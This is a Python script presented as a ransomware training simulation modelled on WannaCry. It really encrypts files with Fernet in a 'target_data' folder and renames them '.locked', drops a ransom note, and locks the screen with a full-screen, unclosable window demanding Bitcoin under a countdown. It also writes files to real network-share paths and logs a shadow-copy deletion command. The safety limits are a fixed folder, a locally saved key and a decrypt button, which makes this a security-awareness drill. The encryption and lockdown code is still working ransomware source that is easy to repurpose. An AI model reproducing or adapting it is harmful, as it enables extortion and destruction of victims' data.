"""
WANA DECRYPT0R 3.0 - Advanced Ransomware Simulation with GUI
=============================================================

High-Fidelity Ransomware Training Simulation
- Full-screen GUI lockdown
- Real encryption with Fernet
- MITRE ATT&CK technique simulation
- VSS tampering simulation (T1490)
- Lateral movement simulation (T1021)
- File encryption (T1486)
- Training mode with decryption capability

USAGE:
    python wana_decrypt0r_gui.py

SAFETY:
    - Only encrypts files in 'target_data' directory
    - Includes decryption functionality
    - Simulation mode available without cryptography library
"""

import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import messagebox
import logging
import random

# --- CONFIGURATION ---
TARGET_DIR = "target_data"
KEY_FILE = "encryption_key.key"
RANSOM_NOTE = "READ_ME_NOW.txt"
LATERAL_FILE = "hacked_lateral.txt"

# VISUALS
BG_COLOR = "#1a0000"     # Deep Blood Red/Black
TEXT_COLOR = "#00ff00"   # Matrix Green
ALERT_COLOR = "#ff0000"  # Bright Red
FONT_TITLE = ("Impact", 40)
FONT_LOG = ("Consolas", 10)
# ---------------------

# Setup Logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("[WARNING] cryptography library not installed. Running in simulation mode.")
    print("Install with: pip install cryptography")

def ensure_target_exists():
    """Ensures target directory and dummy files exist."""
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        
    demos = ["confidential_hr.xlsx", "q3_financials.pdf", "ceo_passwords.txt", "network_map.png"]
    for d in demos:
        path = os.path.join(TARGET_DIR, d)
        if not os.path.exists(path):
            with open(path, "w") as f:
                f.write("CONFIDENTIAL DATA SIMULATION " * 50)

# --- MITRE ATT&CK SIMULATIONS ---

def simulate_vss_tampering(log_func):
    """Simulates T1490: Inhibit System Recovery."""
    log_func("EXEC: vssadmin delete shadows /all /quiet", "T1490")
    # We don't actually delete shadows, just pretend
    time.sleep(0.5)
    log_func("SUCCESS: Shadow Copies Removed (Simulated).", "T1490")

def simulate_lateral_movement(log_func):
    """Simulates T1021: Remote Services."""
    log_func("SCANNING: Network Shares...", "T1021")
    shares = ["C:\\Users\\Public", "Z:\\Shared"]  # Example paths
    for share in shares:
        if os.path.exists(share):
            try:
                dest = os.path.join(share, LATERAL_FILE)
                with open(dest, "w") as f:
                    f.write("Lateral Movement Test")
                log_func(f"SPREAD: {dest}", "T1021")
            except:
                pass
    log_func("LATERAL MOVEMENT COMPLETE.", "T1021")

# --- ENCRYPTION LOGIC ---

def encryption_worker(gui_log_func):
    """Real Encryption Logic running in background."""
    gui_log_func("INITIALIZING PAYLOAD v2.0...", "INIT")
    simulate_vss_tampering(gui_log_func)
    simulate_lateral_movement(gui_log_func)
    
    ensure_target_exists()
    
    key = None
    fernet = None
    
    if HAS_CRYPTO:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        fernet = Fernet(key)
        gui_log_func(f"KEY GEN: {KEY_FILE}", "T1486")
    
    count = 0
    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file == RANSOM_NOTE or file.endswith(".locked") or file == KEY_FILE:
                continue
            
            path = os.path.join(root, file)
            try:
                # Read
                with open(path, "rb") as f:
                    data = f.read()
                # Encrypt
                enc = fernet.encrypt(data) if fernet else b"SIM_" + data
                # Write
                with open(path, "wb") as f:
                    f.write(enc)
                # Rename
                os.rename(path, path + ".locked")
                
                gui_log_func(f"LOCKED: {file}", "T1486")
                count += 1
                time.sleep(0.1)  # Visual effect
            except Exception as e:
                gui_log_func(f"ERR: {file} - {e}", "FAIL")
                
    # Drop Note
    with open(os.path.join(TARGET_DIR, RANSOM_NOTE), "w") as f:
        f.write("YOUR FILES ARE ENCRYPTED. THIS IS A SIMULATION.")
        
    gui_log_func("PAYLOAD EXECUTION COMPLETE.", "DONE")
    gui_log_func("WAITING FOR USER RESPONSE...", "WAIT")

# --- GUI CLASS ---

class RansomwareGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Wana Decrypt0r 3.0 (Sim)")
        self.root.configure(bg=BG_COLOR)
        
        # AGGRESSIVE LOCKDOWN
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.focus_force()
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

        # 1. HEADER
        tk.Label(root, text="⚠ YOUR FILES HAVE BEEN ENCRYPTED! ⚠", 
                 bg=ALERT_COLOR, fg="white", font=FONT_TITLE, pady=20).pack(fill="x")

        # 2. MAIN SPLIT
        frame = tk.Frame(root, bg=BG_COLOR)
        frame.pack(fill="both", expand=True, padx=30, pady=20)

        # LEFT SIDE (Info & Timer)
        left = tk.Frame(frame, bg=BG_COLOR)
        left.pack(side="left", fill="y", padx=20)
        
        self.lock_char = tk.Label(left, text="🔒", font=("Arial", 120), bg=BG_COLOR, fg=ALERT_COLOR)
        self.lock_char.pack()
        
        tk.Label(left, text="Payment Amount:", font=("Arial", 20), bg=BG_COLOR, fg="white").pack(pady=10)
        tk.Label(left, text="$300 USD (Bitcoin)", font=("Arial", 26, "bold"), bg=BG_COLOR, fg="#ffd700").pack()
        
        tk.Label(left, text="Time Remaining:", font=("Arial", 20), bg=BG_COLOR, fg="white").pack(pady=20)
        self.timer_lbl = tk.Label(left, text="72:00:00", font=("Impact", 40), bg="black", fg="#ff0000")
        self.timer_lbl.pack(pady=5)

        # RIGHT SIDE (Message & Logs)
        right = tk.Frame(frame, bg=BG_COLOR)
        right.pack(side="right", fill="both", expand=True)
        
        msg = """
        We are Team DON'T WANNA CRY.
        
        This computer is infected. All sensitive data in 'target_data/' is locked.
        This is a High-Fidelity Security Simulation.
        
        If this were real, you would lose everything.
        
        > MITRE TTPs Detected:
        > T1486 (Encryption), T1490 (VSS Delete), T1021 (Lateral Move)
        """
        tk.Label(right, text=msg, justify="left", font=("Courier", 14), bg=BG_COLOR, fg="white").pack(anchor="w", pady=10)

        # TERMINAL LOG
        tk.Label(right, text="[ SYSTEM ACTIVITY LOG ]", bg=BG_COLOR, fg=TEXT_COLOR, font=("Consolas", 12)).pack(anchor="w")
        self.log_box = tk.Text(right, bg="black", fg=TEXT_COLOR, font=FONT_LOG, height=15)
        self.log_box.pack(fill="both", expand=True, pady=5)

        # 3. BOTTOM BUTTON
        btn_text = "I UNDERSTAND - RESTORE MY FILES (DECRYPT)"
        self.btn = tk.Button(root, text=btn_text, font=("Arial", 20, "bold"), 
                             bg="white", fg="red", height=2,
                             command=self.decrypt_sequence)
        self.btn.pack(side="bottom", pady=40)

        # Start Pulse Animation
        self.pulse_ind = 0
        self.pulse_colors = [ALERT_COLOR, "#b30000"]
        self.root.after(500, self.pulse_icon)

    def pulse_icon(self):
        self.pulse_ind = (self.pulse_ind + 1) % 2
        self.lock_char.config(fg=self.pulse_colors[self.pulse_ind])
        self.root.after(800, self.pulse_icon)

    def add_log(self, msg, tag):
        """Thread-safe logging to GUI."""
        full_msg = f"[{time.strftime('%H:%M:%S')}] [{tag}] {msg}\n"
        self.log_box.insert(tk.END, full_msg)
        self.log_box.see(tk.END)

    def decrypt_sequence(self):
        """The 'Training Mode' Reveal."""
        if messagebox.askyesno("Confirm Restore", "Did you learn from this simulation?\n(Click Yes to Decrypt)"):
            if run_decryption_logic():
                messagebox.showinfo("RECOVERY", "✅ SYSTEM RESTORED. \n\nRemember: Don't click unknown links!")
                self.root.destroy()
                sys.exit(0)
            else:
                messagebox.showerror("Error", "Decryption failed (Check Key File).")

# --- DECRYPTION LOGIC ---
def run_decryption_logic():
    print("Decrypting...")
    if HAS_CRYPTO and os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            key = f.read()
        fernet = Fernet(key)
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                if file.endswith(".locked"):
                    path = os.path.join(root, file)
                    try:
                        with open(path, "rb") as f:
                            d = f.read()
                        res = fernet.decrypt(d)
                        with open(path.replace(".locked", ""), "wb") as f:
                            f.write(res)
                        os.remove(path)
                    except:
                        pass
        return True
    elif not HAS_CRYPTO:
        # Sim mode
        for root, _, files in os.walk(TARGET_DIR):
            for file in files:
                path = os.path.join(root, file)
                if path.endswith(".locked"):
                    try:
                        with open(path, "rb") as f:
                            d = f.read()
                        d = d.replace(b"SIM_", b"")
                        with open(path.replace(".locked", ""), "wb") as f:
                            f.write(d)
                        os.remove(path)
                    except:
                        pass
        return True
    return False

def main():
    # SETUP
    root = tk.Tk()
    gui = RansomwareGUI(root)
    
    # RUN PAYLOAD IN BACKGROUND
    # Pass the GUI's logging function to the worker
    t = threading.Thread(target=encryption_worker, args=(gui.add_log,))
    t.daemon = True
    t.start()
    
    root.mainloop()

if __name__ == "__main__":
    main()
